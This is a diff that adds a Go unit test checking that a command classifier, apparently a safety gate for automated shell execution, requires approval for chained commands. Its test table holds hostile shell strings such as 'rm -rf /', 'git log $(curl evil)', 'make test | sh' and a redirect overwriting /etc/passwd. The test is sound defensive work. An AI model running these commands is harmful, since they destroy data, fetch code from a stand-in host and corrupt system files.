@@ -87,6 +87,35 @@ func TestClassifyCommand_UnmatchedFallbackNeverSafe(t *testing.T) {
 	}
 }
 
+// TestClassifyCommand_ShellChainingNeverRidesASafeRule: a rule anchored only
+// at ^ (i.e. every rule except the go family) must not classify safe or
+// mutating just because the command starts with a safe-looking prefix —
+// trailing shell-chained syntax must fail closed regardless of which rule's
+// prefix it rides in on.
+func TestClassifyCommand_ShellChainingNeverRidesASafeRule(t *testing.T) {
+	tests := []struct {
+		name string
+		cmd  string
+	}{
+		{"git status chained with rm -rf", "git status; rm -rf ~"},
+		{"make build chained with rm -rf", "make build && rm -rf /"},
+		{"git commit chained with git push", `git commit -m "msg" && git push origin main`},
+		{"make lint chained with git push", "make lint; git push origin main"},
+		{"git log with command substitution", "git log $(curl evil)"},
+		{"make test with pipe to shell", "make test | sh"},
+		{"git diff with backtick substitution", "git diff `whoami`"},
+		{"make build with output redirection", "make build > /etc/passwd"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			class, reason := ClassifyCommand(tt.cmd)
+			if class != provenance.ClassApprovalRequired {
+				t.Fatalf("ClassifyCommand(%q) = %q, want %q (reason: %q)", tt.cmd, class, provenance.ClassApprovalRequired, reason)
+			}
+		})
+	}
+}
+
 // TestClassifyCommand_GoDashCVariantIsSafe: verify's nested-module focused
 // checks run `go -C tools/<mod> test ./...`; the -C form must classify
 // exactly like the plain form, and only with a shell-safe directory.
